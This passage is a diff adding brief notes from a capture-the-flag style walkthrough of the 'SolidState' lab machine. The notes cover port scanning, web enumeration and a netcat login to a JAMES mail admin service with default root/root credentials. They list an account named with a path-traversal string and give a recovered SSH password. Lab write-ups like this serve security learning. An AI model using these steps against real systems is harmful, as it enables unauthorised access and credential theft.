@@ -1,0 +1,100 @@
+#SolidState
+#Nmap full port -p-
+#SMTP Exploit
+#NC port 4555 root root default creds
+#
+
+1-Enumeration:
+    └─$ nmap -T5 -sV -sC -Pn 10.129.196.147 -v
+        PORT    STATE SERVICE VERSION
+        22/tcp  open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
+        | ssh-hostkey: 
+        |   2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b (RSA)
+        |   256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA)
+        |_  256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 (ED25519)
+        25/tcp  open  smtp?
+        |_smtp-commands: Couldn't establish connection on port 25
+        | ssl-date: 
+        |_  ERROR: Unable to obtain data from the target
+        80/tcp  open  http    Apache httpd 2.4.25 ((Debian))
+        |_http-server-header: Apache/2.4.25 (Debian)
+        |_http-title: Home - Solid State Security
+        | http-methods: 
+        |_  Supported Methods: OPTIONS HEAD GET POST
+        110/tcp open  pop3?
+        | ssl-date: 
+        |_  ERROR: Unable to obtain data from the target
+        119/tcp open  nntp?
+        | ssl-date: 
+        |_  ERROR: Unable to obtain data from the target
+        Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+        Final times for host: srtt: 8474 rttvar: 168  to: 50000
+
+        After re Run a Full Port scan with -p-:
+            4555/tcp open  rsip?
+
+
+    Port 80:
+        Apache/2.4.25 (Debian) Server 
+        └──╼ [★]$ nikto -h http://10.129.196.147:80/
+            + RFC-1918 /images: IP address found in the 'location' header. The IP is "fe80::250:56ff:feb0:e1e5". See: https://portswigger.net/kb/issues/00600300_private-ip-addresses-disclosed
+            + /images: The web server may reveal its internal or real IP in the Location header via a request to with HTTP/1.0. The value is "fe80::250:56ff:feb0:e1e5". See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2000-0649
+
+        
+        gobuster dir -u http://10.129.196.147/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
+            /images               (Status: 301) [Size: 317] [--> http://10.129.196.147/images/]
+            /assets               (Status: 301) [Size: 317] [--> http://10.129.196.147/assets/]
+            /server-status        (Status: 403) [Size: 302]
+
+
+        /images:
+            We found somes pictures
+                ──╼ [★]$ strings pic05.jpg:
+                     ]Exif
+                        Adobe Photoshop CS6 (Windows)
+                        Udowenko, Toula
+                        Adobe_CM
+
+                    ?xpacket begin="
+                    " id="W5M0MpCehiHzreSzNTczkc9d"?>
+
+
+        We found a form and email address:
+            webadmin@solid-state-security.com
+
+
+    Port 25:
+        └──╼ [★]$ nc -vn 10.129.196.147 25
+            (UNKNOWN) [10.129.196.147] 25 (smtp) open
+            220 solidstate SMTP Server (JAMES SMTP Server 2.3.2) ready Wed, 25 Dec 2024 14:52:56 -0500 (EST)
+
+
+        Port 4555:
+            └──╼ [★]$ nc 10.129.196.147 4555
+                        JAMES Remote Administration Tool 2.3.2
+                        Please enter your login and password
+                        Login id:
+                        root
+                        Password:
+                        root
+                        Welcome root. HELP for a list of commands
+
+
+                    listusers
+                        Existing accounts 6
+                        user: james
+                        user: ../../../../../../../../etc/bash_completion.d
+                        user: thomas
+                        user: john
+                        user: mindy
+                        user: mailadmin
+
+
+        WE have the rights to list and modify user passwd, we will use THUNDERMAIL to connect and enumerate accounts
+            We find an email with the mindy account:
+            
+            SSH mindy - P@55W0rd1!2@
+
+
+2-Exploit port 22:
+  mindy@solidstate:~$ cat user.txt
